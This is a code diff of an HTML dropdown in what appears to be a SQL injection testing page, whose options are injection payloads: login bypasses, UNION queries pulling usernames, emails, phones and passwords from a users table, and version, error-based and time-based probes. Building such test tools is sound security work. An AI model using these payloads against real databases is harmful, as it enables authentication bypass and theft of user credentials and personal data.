@@ -28,22 +28,10 @@
                                 <option value="">Select a test case...</option>
                                 <optgroup label="Basic Injection">
                                     <option value="' OR '1'='1">Basic TRUE condition</option>
-                                    <option value="' OR 1=1--">Comment out rest of query</option>
-                                    <option value="admin'--">Login bypass</option>
+                                    <option value="testuser'--">Login bypass with valid username</option>
                                 </optgroup>
-                                <optgroup label="UNION Attacks">
-                                    <option value="' UNION SELECT id,username,NULL,NULL,NULL FROM test_user_details--">UNION two columns</option>
-                                    <option value="' UNION SELECT user_id,address,phone,NULL,NULL FROM test_user_details--">UNION user_details columns</option>
-                                    <option value="' UNION SELECT id,username,email,password,created_at FROM test_users--">UNION users extraction</option>
-                                </optgroup>
-                                <optgroup label="Information Gathering">
-                                    <option value="' ORDER BY 1--">Column count (ORDER BY 1)</option>
-                                    <option value="' AND 1=CONVERT(int,@@version)--">Version detection</option>
-                                    <option value="' AND 1=1 WAITFOR DELAY '0:0:5'--">Time-based test</option>
-                                </optgroup>
-                                <optgroup label="Error Based">
-                                    <option value="' AND 1=CONVERT(int,(SELECT @@version))--">Error-based version</option>
-                                    <option value="' AND 1=CONVERT(int,(SELECT top 1 name FROM sysobjects))--">Error-based table names</option>
+                                <optgroup label="UNION Attack">
+                                    <option value="' UNION SELECT id,username,first_name,last_name,email,phone_number,_password,created_at,updated_at FROM users--">UNION users extraction</option>
                                 </optgroup>
                             </select>
                         </div>
